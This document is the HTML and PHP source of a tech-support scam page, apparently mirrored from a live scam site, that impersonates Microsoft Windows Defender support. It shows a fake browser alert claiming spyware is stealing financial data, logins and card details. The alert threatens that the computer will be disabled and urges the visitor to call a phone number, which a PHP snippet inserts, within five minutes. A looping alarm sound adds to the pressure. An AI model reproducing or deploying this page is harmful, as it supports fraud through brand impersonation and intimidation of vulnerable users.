<!DOCTYPE html>
<html>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-112262099-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-112262099-1');
</script>


<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Windows Defender</title>

<link href="css/bootstrap.css" type="text/css" rel="stylesheet" />
<link href="css/main.css" type="text/css" rel="stylesheet" />
<script src="js/jquery.js" type="text/javascript"></script>
	<?php
		$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
		$phone = fgets($myfile);
		//
		$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
		fclose($myfile);
	?>
<script type="text/javascript">
var _number = "<?php echo $phone ?>";
</script>
</head>

<body style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;">
<div id="blue-screen">
<table width='100%' height='61' cellpadding='0' cellspacing='0' border='0'><tr><td width='766'><img src='img/bg-1.jpg'></td><td align='right' background='img/bg-2.jpg'><img src='img/bg-3.jpg'></td></tr></table>
</div>
<div id="light-screen">
	

<table border="0" cellpadding="0" cellspacing="0" width="100%">
      <tbody>
    <tr>
          <td align="center" valign="top"><div id="map"></div></td>
        </tr>
  </tbody>
    </table>
<nav class="navbar navbar-default navbar-static-tops">
      <div class="container">
    <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
          <a class="navbar-brand" href="#"> </a> </div>
    <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
        <li class="dropdown"> <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Store<span class="caret"></span></a>
              <ul class="dropdown-menu">
            <li><a href="#">Store Home </a></li>
            <li><a href="#">Devices</a></li>
            <li><a href="#">Software</a></li>
            <li><a href="#">Apps</a></li>
            <li><a href="#">Games</a></li>
          </ul>
            </li>
        <li class="dropdown"> <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Products<span class="caret"></span></a>
              <ul class="dropdown-menu">
            <li><a href="#">Software &amp; services</a></li>
            <li><a href="#">Devices &amp; Xbox</a></li>
            <li><a href="#">For business</a></li>
          </ul>
            </li>
        <li><a href="#">Support</a></li>
      </ul>
          <ul class="nav navbar-nav navbar-right">
        <li><a href="#"><span class="glyphicon glyphicon-shopping-cart"></span>0</a></li>
        <li><a href="#"><strong>Call us at : <?php echo $phone ?>
</strong></a></li>
      </ul>
        </div>
    <!--/.nav-collapse --> 
  </div>
    </nav>
<div class="container">
      <div class="jumbotron">
    <div class="row">
          <div class="col-xs-6 text-left">
        <h2 style="padding-left: 30px;">Call for support:</h2>
        <h2><?php echo $phone ?><span id="FormattedNumber1"></span></h2>
      </div>
          <div class="col-xs-6 text-right">
        <h2 style="padding-left: 30px;">Call for support:</h2>
        <h2><?php echo $phone ?><span id="FormattedNumber2"></span></h2>
      </div>
        </div>
  </div>
      <div class="row" style="padding: 40px; text-align: center;">
    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Manage my account</span> </a> </div>
    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Ask the community</span> </a> </div>
    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-user"></span> <span>Contact Answer Desk</span> </a> </div>
    <div class="col-xs-6 col-sm-3"> <a> <span class="glyphicon glyphicon-download-alt"></span> <span>Find downloads</span> </a> </div>
  </div>
      <div class="row" style="text-align: center;">
    <h3>I need help with...</h3>
    <div class="bs-glyphicons" style="margin-top:30px;">
          <div class="row">
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-1.svg')"></span> <span class="glyphicon-class product-name">Windows</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-2.svg')"></span> <span class="glyphicon-class product-name">Windows Phone 8</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-3.svg')"></span> <span class="glyphicon-class product-name">Lumia devices</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-4.svg')"></span> <span class="glyphicon-class product-name">Xbox</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-5.svg')"></span> <span class="glyphicon-class product-name">Office</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-6.svg')"></span> <span class="glyphicon-class product-name">OneDrive</span> </div>
      </div>
          <div class="row">
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-7.svg')"></span> <span class="glyphicon-class product-name">Surface</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-8.svg')"></span> <span class="glyphicon-class product-name">Microsoft Edge</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-9.svg')"></span> <span class="glyphicon-class product-name">Internet Explorer</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-10.svg')"></span> <span class="glyphicon-class product-name">Skype</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-11.svg')"></span> <span class="glyphicon-class product-name">Outlook.com</span> </div>
        <div class="col-lg-2 col-md-4 col-xs-6"> <span class="glyphicon product-img" aria-hidden="true" style="background-image: url('img/img-12.svg')"></span> <span class="glyphicon-class product-name">MSN</span> </div>
      </div>
        </div>
  </div>
      <div class="row" style="text-align: center; padding-bottom: 50px;"> <a>
        <h4 style="margin-top: 40px; margin-bottom: 80px;">View all Windows products</h4>
        </a>
    <div class="row">
          <div class="col-md-4" style="text-align:left;">
        <h4>Business, IT &amp; developer</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>Support for small business</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Enterprise and partners</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>IT Professionals</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Developers</a></li>
            </ul>
      </div>
          <div class="col-md-4" style="text-align:left;">
        <h4>Set up &amp; install</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>How to upgrade to Windows 10</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Install Office 365 Home, Personal, or
                University</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Activate Office 365 Home, Personal, University,
                Office 2013, or Office 2016</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>why is office taking so long to install?</a></li>
            </ul>
      </div>
          <div class="col-md-4" style="text-align:left;">
        <h4>Popular topics</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>Activation in Windows 10</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Need Help with Office 2016?</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 FAQ</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 help &amp; how-to</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 Mobile help &amp; how-to</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Can't find Office applications in Windows 10,
                Windows 8, or WIndows 7?</a></li>
            </ul>
      </div>
        </div>
  </div>
    </div>
<footer class="footer">
      <div class="container">
    <div class="row">
          <div class="col-md-4" style="text-align:left;">
        <h4>Support</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>Account support</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Supported products list</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Product support lifecycle</a></li>
            </ul>
      </div>
          <div class="col-md-4" style="text-align:left;">
        <h4>Security</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>Safety &amp; Security Center</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Download Security Essentials</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Malicious Software Removal Tool</a></li>
            </ul>
      </div>
          <div class="col-md-4" style="text-align:left;">
        <h4>Popular topics</h4>
        <ul style="padding:0px;">
              <li style="list-style: none; padding:10px 0px;"><a>Report a support scam</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Disability Answer Desk</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Locate Windows addresses worldwide</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 help &amp; how-to</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Windows 10 Mobile help &amp; how-to</a></li>
              <li style="list-style: none; padding:10px 0px;"><a>Can't find Office applications in Windows 10,
                Windows 8, or WIndows 7?</a></li>
            </ul>
      </div>
        </div>
    <div class="row" style="font-size: 1.2rem; padding:30px 0px;">
          <div style="float:left;"><span class="glyphicon glyphicon-cd"></span><span>English(United States)</span> </div>
          <div style="float:right;"> <span style="padding:0px 15px;">Terms of use</span> <span style="padding:0px 15px;">English(United States)</span> <span style="padding:0px 15px;">Trademarks</span> <span style="padding:0px 15px;">@2016 Windows</span> </div>
        </div>
  </div>
    </footer>


 

<div id="chrome-alerts" class="chrome-alert">
      <div> <a href="#" class="cross">×</a>
    <h1>support.windows.com says:</h1>
    <div class="content-box" id="alert-content-box">
          <p>** Windows Warning  Alert  **<br>
        Malicious Spyware/Riskware Detected<br>
        Error # 0x80072ee7<br>
        <br>
        Please call us immediately at: <?php echo $phone ?><br>
        Do not ignore this critical alert.<br>
        If you close this page, your computer access will be disabled to prevent further damage to our network.<br>
        Your computer has alerted us that it has been infected with a  Spyware and riskware.  The following information is being stolen...<br>
        Financial Data<br>
        Facebook Logins<br>
        Credit Card Details<br>
        Email Account Logins<br>
        Photos stored on this computer<br>
        You must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity.  Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.<br>
        <br>
        Call us at: <?php echo $phone ?></p>
        </div>
    <label style="font-size: 12px;">
          <input type="checkbox">
          Prevent this page from creating additional dialogues.</label>
    <div class="action_buttons"> <a style="color:#fff;background:#F00;" href="javascript:;" class="active" id="leave_page">Force Quit</a> </div>
  </div>
    </div>
</div>




<audio id="play" loop><source src="alert-msg.mp3" type="audio/mpeg"></audio>
<script src="js/main.js" type="text/javascript"></script>
</body>

<!-- Mirrored from protectcompro.world/defender/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 23 Nov 2017 07:23:45 GMT -->
<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'a2plcpnl0193'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>
